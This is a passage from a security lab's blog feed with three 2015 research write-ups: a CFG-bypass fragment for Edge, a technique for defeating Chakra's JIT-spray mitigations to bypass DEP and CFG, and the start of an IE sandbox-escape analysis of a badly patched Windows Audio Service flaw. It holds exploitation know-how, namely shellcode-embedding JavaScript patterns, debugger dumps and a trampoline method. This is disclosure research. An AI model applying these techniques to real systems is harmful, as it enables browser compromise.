<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.text</span>:002AB460 <span class="keyword">push</span>    <span class="literal">ebp</span></span><br><span class="line"><span class="string">.text</span>:002AB461 <span class="keyword">mov</span>     <span class="literal">ebp</span>, <span class="literal">esp</span></span><br><span class="line"><span class="string">.text</span>:002AB463 <span class="keyword">lea</span>     <span class="literal">eax</span>, [<span class="literal">esp</span>+arg_0]</span><br><span class="line"><span class="string">.text</span>:002AB467 <span class="keyword">push</span>    <span class="literal">eax</span></span><br><span class="line"><span class="string">.text</span>:002AB468 <span class="keyword">call</span>    <span class="keyword">Js</span>::JavascriptFunction::DeferredParse</span><br><span class="line"><span class="string">.text</span>:002AB46D <span class="keyword">mov</span>     <span class="literal">ecx</span>, <span class="literal">eax</span>        <span class="comment">; this</span></span><br><span class="line"><span class="string">.text</span>:002AB46F <span class="keyword">call</span>    <span class="literal">ds</span>:___guard_check_icall_fptr  //<span class="keyword">add</span> cfg check</span><br><span class="line"><span class="string">.text</span>:002AB475 <span class="keyword">mov</span>     <span class="literal">eax</span>, <span class="literal">ecx</span></span><br><span class="line"><span class="string">.text</span>:002AB477 <span class="keyword">pop</span>     <span class="literal">ebp</span></span><br><span class="line"><span class="string">.text</span>:002AB478 <span class="keyword">jmp</span>     <span class="literal">eax</span></span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2><ol>
<li><p><a href="http://xlab.tencent.com/en/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-charkra-engine/">《Bypass DEP and CFG using JIT compiler in Chakra engine》</a></p>
</li>
<li><p><a href="https://github.com/exp-sky/HitCon-2015-spartan-0day-exploit/blob/master/Spartan%200day%20%26%20Exploit-m.pdf" target="_blank" rel="external">《spartan 0day &amp; exploit》</a></p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>This post is initially inspired by a talk with @<a href="https://twitter.com/tombkeeper">TK</a>, during which I learned the process and detail on how to successfully bypass CFG (reference: use Chakra JIT to bypass DEP and CFG). Due to my interest in its technology, I spent some time reading related materials and found another position to bypass CFG. I would like to thanks @<a href="https://twitter.com/tombkeeper">TK</a> for enlightening me on the ideas and techniques mentioned in this post.</p>
<p>There are plenty of articles that focus on the analysis of CFG, if you are interested, you may refer to my previous speech on HitCon 2015(<a href="https://github.com/exp-sky/HitCon-2015-spartan-0day-exploit/blob/master/Spartan%200day%20%26%20Exploit-m.pdf">《spartan 0day &amp; exploit》</a>). To be clear, this post is the part that is not revealed in my speech. At this point, the method to implement arbitrary code execution on edge through a write to memory is completely revealed.<br>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[Bypass DEP and CFG using JIT compiler in Chakra engine]]></title>
    <link href="http://xlab.tencent.com/en/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-charkra-engine/"/>
    <id>http://xlab.tencent.com/en/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-charkra-engine/</id>
    <published>2015-12-09T05:19:49.000Z</published>
    <updated>2015-12-09T09:40:41.000Z</updated>
    <content type="html"><![CDATA[<p>JIT Spray is a popular exploitation technique first appeared in 2010. It embeds shellcode as immediate value into the executable code the JIT compiler generates. Currently, all major JIT engine, including Chakra, already have many mitigations in place against this technique, such as random NOP instruction insertion, constant blinding, etc.</p>
<p>This article points out two weaknesses in Chakra’s JIT Spray mitigation (in Windows 8.1 and older operating systems, and Windows 10, respectively), allowing attackers to use JIT Spray to execute shellcode, bypassing DEP. I will also discuss a method to bypass CFG using Chakra’s JIT compiler.<br><a id="more"></a></p>
<h2 id="0x01_Constant_Blinding">0x01 Constant Blinding</h2><p>Constant Blinding is the most important mitigation strategy against JIT Spray. Chakra engine use a randomly generated key to XOR every user inputted immediate value that is not 0x0000 or 0xFFFF, and decrypts it on the fly. For example, the following JavaScript:</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Generates machine code like this:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">096b0091 ba555593c5      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0C5935555h</span></span><br><span class="line">096b0096 81f2c5c50355    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">5503C5C5h</span></span><br><span class="line">096b009c 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b009e bab045edfb      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0FBED45B0h</span></span><br><span class="line">096b00a3 81f220d57d6b    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">6B7DD520h</span></span><br><span class="line">096b00a9 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b00ab baef85f139      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">39F185EFh</span></span><br><span class="line">096b00b0 81f27f1561a9    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">0A961157Fh</span></span><br><span class="line">096b00b6 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>The immediate value in the resulting machine code is unpredictable, thus shellcode embedding is not possible.</p>
<h2 id="0x02_Bypass_Chakra’s_Constant_Blinding_on_Windows_8-1_or_Older_Operating_Systems">0x02 Bypass Chakra’s Constant Blinding on Windows 8.1 or Older Operating Systems</h2><p>Internally, for integer n, it is stored as n*2+1 by Chakra engine. When evaluating the expression n=n+m, it is not necessary to restore the original value of n before adding m, its result can be obtained by directly adding m*2 to n*2+1. Chakra engine on Windows 8.1 and older operating systems treat m*2 as self-generated data rather than user input, so constant blinding does not apply. For the following JavaScript code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>When some conditions are met, could generate machine code like this:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">05010090</span> <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">05010096</span> <span class="number">0f</span>80d6010000    jo      <span class="number">05010272</span></span><br><span class="line"><span class="number">0501009</span>c <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">0501009</span>e <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>a1 f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>a4 <span class="number">0f</span>8413020000    je      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>aa <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line"><span class="number">050100</span>ac <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">050100</span>b2 <span class="number">0f</span>8005020000    jo      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>b8 <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">050100</span>ba <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>bd f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>c0 <span class="number">0f</span>8442020000    je      <span class="number">05010308</span></span><br><span class="line"><span class="number">050100</span>c6 <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">05010090</span> + <span class="number">2</span> l <span class="number">3</span></span><br><span class="line"><span class="number">05010092</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010093</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010094</span> eb18            jmp     <span class="number">050100</span>ae</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">050100</span>ae l <span class="number">3</span></span><br><span class="line"><span class="number">050100</span>ae <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>af <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>b0 eb18            jmp     <span class="number">050100</span>ca</span><br></pre></td></tr></table></figure>
<p>If we could make each instruction in our shellcode not larger than 2 bytes, it could be embedded in the immediate value. The actual immediate value is 2 times of the value in JavaScript, so the first byte must be an even number if we use a 2-byte instruction, which is not very hard to satisfy.</p>
<h2 id="0x03_Bypass_Chakra’s_Constant_Blinding_on_Windows_10">0x03 Bypass Chakra’s Constant Blinding on Windows 10</h2><p>Chakra engine on Windows 10 does not suffer from this issue. But in order to generate highly optimized code, when writing to an integer array, the following JavaScript code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var ar = <span class="keyword">new</span> Uint16Array(<span class="number">0x10000</span>);</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Generates the following machine code:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">0b8110e0 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110e9 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110f2 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110fb 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>To mitigate against JIT Spray, Chakra only allows user to control at most 2 bytes of immediate value. But in this specific situation, the array index and the value being written appear in one instruction. Now we can control 4 bytes instead of 2 bytes of data.</p>
<p>Previously discussed 2-byte shellcode can also be used here. Due to the additional 2-byte 0x00 (which will be interpreted as “add byte ptr[eax], al”), we need to make the eax point to a writable location in the first two instruction.</p>
<h2 id="0x04_Using_Chakra_Engine_to_Bypass_CFG">0x04 Using Chakra Engine to Bypass CFG</h2><p>By using previously discussed methods, we can do a JIT Spray to bypass DEP, but the shellcode entry point address embedded in the JIT’d code obviously cannot pass the CFG check. But actually, there are implementation flaws in Chakra engine itself that can be exploited to bypass CFG.</p>
<p>There is a fixed entry point function that always gets generated regardless of the need of JIT of the currently executing JavaScript code:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; uf 4ff0000</span><br><span class="line">04ff0000 <span class="number">55</span>          <span class="keyword">push</span>  <span class="literal">ebp</span></span><br><span class="line">04ff0001 8bec        <span class="keyword">mov</span>   <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">04ff0003 8b4508      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff0006 8b4014      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">14h</span>]</span><br><span class="line">04ff0009 8b4840      <span class="keyword">mov</span>   <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">40h</span>]</span><br><span class="line">04ff000c 8d4508      <span class="keyword">lea</span>   <span class="literal">eax</span>,[<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff000f <span class="number">50</span>          <span class="keyword">push</span>  <span class="literal">eax</span></span><br><span class="line">04ff0010 b840cb5a71  <span class="keyword">mov</span>   <span class="literal">eax</span>, <span class="number">715acb40h</span> <span class="comment">; jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;</span></span><br><span class="line">04ff0015 ffe1        <span class="keyword">jmp</span>   <span class="literal">ecx</span></span><br></pre></td></tr></table></figure>
<p>This function address can pass the CFG check. Also, before jmp ecx, there is no CFG check of the target address. This can be used as a trampoline for jumping to arbitrary address. We will call it “cfgJumper” hereafter.</p>
<h2 id="0x05_Locating_JIT_Memory_and_cfgJumper">0x05 Locating JIT Memory and cfgJumper</h2><p>Locating the JIT compiled code and the cfgJumper are needed if we want to use JIT Spray to bypass DEP and use cfgJumper to bypass CFG. Interestingly, the method of locating both are almost identical.</p>
<p>Every JavaScript function has a corresponding Js::ScriptFunction object. Every Js::ScriptFunction object also includes a Js::FunctionBody object. Inside this Js::FunctionObject object, a function pointer to the actual function entry point is stored.</p>
<p>If a function is never called, this function pointer points to Js::InterpreterStackFrame::DelayDynamicInterpreterThunk:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@........... <span class="comment">// Js::ScriptFunction</span></span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">70181720</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o ..p........ <span class="comment">// Js::FunctionBody</span></span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">70181720</span> l <span class="number">1</span></span><br><span class="line">Chakra!Js::InterpreterStackFrame::DelayDynamicInterpreterThunk:</span><br><span class="line"><span class="number">70181720</span> <span class="number">55</span>              push    ebp</span><br></pre></td></tr></table></figure>
<p>If a function has been called before, but never compiled into JIT’d code, this function pointer points to cfgJumper: </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00860000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00860000</span></span><br><span class="line"><span class="number">00860000</span> <span class="number">55</span>          push  ebp</span><br><span class="line"><span class="number">00860001</span> <span class="number">8</span>bec        mov   ebp,esp</span><br><span class="line"><span class="number">00860003</span> <span class="number">8</span>b4508      mov   eax,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">00860006</span> <span class="number">8</span>b4014      mov   eax,dword ptr [eax+<span class="number">14</span>h]</span><br><span class="line"><span class="number">00860009</span> <span class="number">8</span>b4840      mov   ecx,dword ptr [eax+<span class="number">40</span>h]</span><br><span class="line"><span class="number">0086000</span>c <span class="number">8</span>d4508      lea   eax,[ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">0086000f</span> <span class="number">50</span>          push  eax</span><br><span class="line"><span class="number">00860010</span> b800240870  mov   <span class="number">70082400</span>h ; Chakra!Js::InterpreterStackFrame::InterpreterThunk</span><br><span class="line"><span class="number">00860015</span> ffe1        jmp   ecx</span><br></pre></td></tr></table></figure>
<p>If a function is regularly called and Chakra compiles it into JIT’d code, this function pointer points to the actual code: </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b89de70 l8</span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b8d0000 l8</span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00950000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00950000</span></span><br><span class="line"><span class="number">00950000</span> <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">00950001</span> <span class="number">8</span>bec            mov     ebp,esp</span><br><span class="line"><span class="number">00950003</span> <span class="number">81f</span>c44c9120b    cmp     esp,<span class="number">0</span>B12C944h</span><br><span class="line"><span class="number">00950009</span> <span class="number">7f</span>18            jg      <span class="number">00950023</span></span><br><span class="line"><span class="number">0095000</span>b <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000f</span> <span class="number">68e0</span>c72c07      push    <span class="number">72</span>CC7E0h</span><br><span class="line"><span class="number">00950014</span> <span class="number">6844090000</span>      push    <span class="number">944</span>h</span><br></pre></td></tr></table></figure>
<p>With understandings of the internal structure of Js::ScriptFunction and Js::FunctionBody, we could precisely locate the JIT’d code and the cfgJumper.</p>
<h2 id="0x06_Avoiding_Randomly_Inserted_NOP_instructions">0x06 Avoiding Randomly Inserted NOP instructions</h2><p>Other than constant blinding, Chakra engine also employs randomized NOP instruction insertion to mitigate JIT Spray. But the density of the insertion is rather low. Testing code combines 29 16-bit number to form a shellcode, only 29 x86 instructions are generated on Windows 10, with virtually no NOP instruction inserted in between. But in the exploitation method used on Windows 8.1 and older operating systems, about 200 x86 instruction are generated, and highly likely to contain NOP instructions.</p>
<p>To solve this problem:</p>
<ol>
<li>Create a new script tag, put in a JavaScript function that contains JIT shellcode.</li>
<li>Call this function in a loop to trigger JIT compilation.</li>
<li>Read in compiled code to determine if there is any NOP instruction inserted.</li>
<li>If any, destroy the script tag and repeat this procedure.</li>
</ol>
<p>Testing environments are Windows 8.1 with all updates till May 2015 and Windows 10 TP 9926.<br>Microsoft informed me that it has been fixed in September 2015.</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>JIT Spray is a popular exploitation technique first appeared in 2010. It embeds shellcode as immediate value into the executable code the JIT compiler generates. Currently, all major JIT engine, including Chakra, already have many mitigations in place against this technique, such as random NOP instruction insertion, constant blinding, etc.</p>
<p>This article points out two weaknesses in Chakra’s JIT Spray mitigation (in Windows 8.1 and older operating systems, and Windows 10, respectively), allowing attackers to use JIT Spray to execute shellcode, bypassing DEP. I will also discuss a method to bypass CFG using Chakra’s JIT compiler.<br>]]>
    
    </summary>
    
      <category term="CFG" scheme="http://xlab.tencent.com/en/tags/CFG/"/>
    
      <category term="Chakra" scheme="http://xlab.tencent.com/en/tags/Chakra/"/>
    
      <category term="DEP" scheme="http://xlab.tencent.com/en/tags/DEP/"/>
    
      <category term="JIT" scheme="http://xlab.tencent.com/en/tags/JIT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Poking a Hole in the Patch--Escaping from IE Sandbox with a Poorly Patched Vulnerability]]></title>
    <link href="http://xlab.tencent.com/en/2015/08/27/Poking-a-Hole-in-the-Patch/"/>
    <id>http://xlab.tencent.com/en/2015/08/27/Poking-a-Hole-in-the-Patch/</id>
    <published>2015-08-27T11:17:24.000Z</published>
    <updated>2015-11-30T05:40:06.000Z</updated>
    <content type="html"><![CDATA[<p>James Forshaw reported a vulnerability to Microsoft regarding Windows Audio Service in November 2014. In our analysis, we discovered that the patch Microsoft release later did not completely solve the problem. With a combination of techniques, we successfully bypassed the patch and can exploit the vulnerability on patched system.<br><a id="more"></a></p>
<h2 id="0x00_The_Problem">0x00 The Problem</h2><p>There was a privilege escalation vulnerability in Windows Audio Service, reported by James Forshaw in November 2014. </p>
<p>Windows Audio Service, which manage audio sessions of all the processes running in the system, store audio session configurations under registry key HKCU\Software\Microsoft\Internet Explorer\LowRegistry\Audio\PolicyConfig.</p>
<p>For this configuration to be modifiable even by low privileged processes, it recursively set the sub key ACLs to give write access to Low IL processes.</p>
<p>If an attacker sets a symbolic link under this key, and points the symbolic link to a higher-privileged location, Windows Audio Service would make that location controllable by Low IL.</p>
<h2 id="0x01_The_Patch">0x01 The Patch</h2><p>Microsoft released a security bulletin MS14-071, followed by a patch KB3005607, in order to fix this vulnerability.<br>This patch added two functions, SafeRegCreateKeyEx and DetectRegistryLink.</p>
<p>The following is reconstructed DetectRegistryLink function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DetectRegistryLink</span><span class="params">(<span class="keyword">const</span> HKEY key_handle, <span class="keyword">const</span> wchar_t sub_key_path[], HKEY * out_handle)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> detect_result = <span class="number">0</span>;</span><br><span class="line">    HKEY sub_key_handle;</span><br><span class="line">    LSTATUS status = RegOpenKeyExW(key_handle,</span><br><span class="line">                                   sub_key_path,</span><br><span class="line">                                   REG_OPTION_OPEN_LINK,</span><br><span class="line">                                   KEY_ALL_ACCESS,</span><br><span class="line">                                   &amp;sub_key_handle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (status == ERROR_FILE_NOT_FOUND) &#123;</span><br><span class="line">            detect_result = <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == ERROR_ACCESS_DENIED) &#123;</span><br><span class="line">            detect_result = <span class="number">4</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            detect_result = <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DWORD key_type;</span><br><span class="line">        BYTE data[MAX_PATH * <span class="number">2</span>];</span><br><span class="line">        DWORD data_size = <span class="keyword">sizeof</span>(data);</span><br><span class="line"></span><br><span class="line">        status = RegQueryValueExW(sub_key_handle, </span><br><span class="line">                                  kSymbolicLinkValueName, </span><br><span class="line">                                  <span class="literal">nullptr</span>,</span><br><span class="line">                                  &amp;key_type, </span><br><span class="line">                                  data, </span><br><span class="line">                                  &amp;data_size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((status == ERROR_SUCCESS) || (status == ERROR_MORE_DATA)) &amp;&amp; (key_type == REG_LINK)) &#123;</span><br><span class="line">            detect_result = <span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> ((status == ERROR_FILE_NOT_FOUND) &amp;&amp; (detect_result != <span class="number">1</span>)) &#123;</span><br><span class="line">            HKEY temp_key_handle;</span><br><span class="line">            status = RegOpenKeyExW(key_handle,</span><br><span class="line">                                   sub_key_path,</span><br><span class="line">                                   <span class="number">0</span>,</span><br><span class="line">                                   KEY_READ,</span><br><span class="line">                                   &amp;temp_key_handle);</span><br><span class="line"></span><br><span class="line">            RegCloseKey(temp_key_handle);</span><br><span class="line">            detect_result = (status == ERROR_SUCCESS) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *out_handle = sub_key_handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> detect_result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
